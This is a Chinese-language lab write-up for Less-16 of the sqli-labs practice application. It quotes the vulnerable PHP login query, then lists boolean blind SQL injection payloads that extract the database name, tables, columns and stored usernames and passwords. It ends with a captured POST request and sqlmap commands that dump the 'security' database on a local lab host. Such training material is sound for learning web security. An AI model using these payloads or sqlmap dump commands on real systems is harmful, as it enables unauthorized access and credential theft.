---
title: less16
url: https://www.yuque.com/u29002979/ep2zrx/fa4zbswybtorktcf
---

```bash
$uname='"'.$uname.'"';
$passwd='"'.$passwd.'"'; 
@$sql="SELECT username, password FROM users WHERE username=($uname) and password=($passwd) LIMIT 0,1";
$result=mysql_query($sql);
```


在Less15的原题上将闭合方式变成了") <a name="OMlVf"></a>

# 布尔盲注

```bash
判断数据库名称长度
admin") or length(database())=8--+
显示蓝色图片，说明数据库长度为8

逐一猜解数据库名称
admin") or ascii(substr(database(),1,1))=115--+
第一个字符是s  ...

猜解数据表名称
admin") or ascii(mid((select group_concat(table_name) from information_schema.tables where table_schema=database()),1,1))>101 --+
第一个字符是e ...

猜解字段名称
admin") or ascii(mid((select group_concat(column_name) from information_schema.columns where table_schema=database() and table_name='users'),1,1))=105--+
第一个字符是i ...

猜解字段内容
admin") or ascii(mid((select group_concat(username,0x7e,password) from users),1,1))=68--+
第一个字符是D ...
```

<a name="sVerI"></a>

# sqlmap

<a name="OwLMd"></a>

## burpsuite抓包

```bash
POST /Less-16/ HTTP/1.1
Host: 192.168.31.193
Content-Length: 24
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
Origin: http://192.168.31.193
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Referer: http://192.168.31.193/Less-16/
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Connection: close

passwd=admin&uname=admin
```

```bash
sqlmap -r 1.txt -p 'uname' --level 2 --batch
爆破数据库
sqlmap -r 1.txt -p 'uname' --level 2 --batch --current-db
爆破表
sqlmap -r 1.txt -p 'uname' --level 2 --batch -D security --tables
脱库
sqlmap -r 1.txt -p 'uname' --level 2 --batch -D security --dump
```
